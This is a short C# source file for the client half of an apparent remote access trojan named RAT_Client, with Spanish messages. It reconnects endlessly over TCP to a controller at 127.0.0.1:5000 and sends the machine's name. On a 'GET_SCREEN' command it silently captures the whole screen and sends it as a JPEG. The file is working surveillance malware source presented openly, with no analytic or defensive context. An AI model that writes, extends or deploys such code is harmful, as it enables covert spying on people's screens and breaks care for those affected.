using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace RAT_Client
{
    static class Program
    {
        static void Main()
        {
            while (true)
            {
                try
                {
                    var client = new TcpClient();
                    client.Connect("127.0.0.1", 5000);

                    Console.WriteLine("Conectado al servidor.");

                    using (var stream = client.GetStream())
                    using (var writer = new StreamWriter(stream))
                    using (var reader = new StreamReader(stream))
                    {
                        var pcName = Environment.MachineName;
                        writer.WriteLine(pcName);
                        writer.Flush();

                        while (true)
                        {
                            var command = reader.ReadLine();
                            if (command == null) break;

                            if (command == "GET_SCREEN")
                            {
                                SendScreen(stream);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error: {ex.Message}. Reintentando en 5 segundos...");
                    Thread.Sleep(5000);
                }
            }
        }

        private static void SendScreen(NetworkStream stream)
        {
            try
            {
                var screen = CaptureScreen();

                using (var memoryStream = new MemoryStream())
                {
                    screen.Save(memoryStream, ImageFormat.Jpeg);
                    var buffer = memoryStream.ToArray();

                    var length = BitConverter.GetBytes(buffer.Length);
                    stream.Write(length, 0, length.Length); // Enviar tamaño de la imagen
                    stream.Write(buffer, 0, buffer.Length); // Enviar la imagen
                    stream.Flush();
                }
            }
            catch (IOException)
            {
                Console.WriteLine("Conexión perdida al enviar la pantalla.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error al enviar la pantalla: {ex.Message}");
            }
        }

        private static Bitmap CaptureScreen()
        {
            var bounds = Screen.PrimaryScreen.Bounds;
            var bitmap = new Bitmap(bounds.Width, bounds.Height);

            using (var g = Graphics.FromImage(bitmap))
            {
                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
            }

            return bitmap;
        }
    }
}
